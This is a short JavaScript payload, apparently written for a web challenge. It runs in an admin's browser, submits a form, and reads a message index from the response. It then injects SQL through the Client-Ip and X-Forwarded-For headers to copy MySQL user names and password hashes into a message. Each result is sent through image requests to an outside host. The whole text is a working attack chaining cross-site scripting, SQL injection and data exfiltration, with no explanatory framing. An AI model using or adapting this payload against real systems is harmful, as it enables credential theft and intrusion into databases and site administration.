xhr = new XMLHttpRequest();

xhr.open("POST", "/index.php", false);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send("img=&content=&captcha_md5=&geetest_challenge=ea60531acbe76fd4f43286cfbb8814f84g&geetest_validate=cd01bb97b6638fbd740c3d3554d92dbd&geetest_seccode=cd01bb97b6638fbd740c3d3554d92dbd%7Cjordan&submit=Submit");
idx = xhr.responseText.match('index=(\\w+)')[1];

document.write("<img src='http://ibrahim-elsayed.com/IDXIDXIDX?" + escape(idx) + "' />");

xhr.open("GET", "/admin/read.php?index=" + idx, false);
sqli = "', `is_read` = 0, `content` = (SELECT group_concat(user,0x3a,password) from mysql.user) WHERE `message`.`index` = 'st5mNqM4dkLs8IfyP6Tz2zQanN1kOBMG' # ";
xhr.setRequestHeader('Client-Ip', sqli);
xhr.setRequestHeader('X-Forwarded-For', sqli);
xhr.send(null);
document.write("<img src='http://ibrahim-elsayed.com/CONTENZZ?" + escape(xhr.responseText) + "' />");

xhr.open("GET", "/admin/read.php?index=st5mNqM4dkLs8IfyP6Tz2zQanN1kOBMG", false);
xhr.send(null);
document.write("<img src='http://ibrahim-elsayed.com/TWOCON?" + escape(xhr.responseText) + "' />");
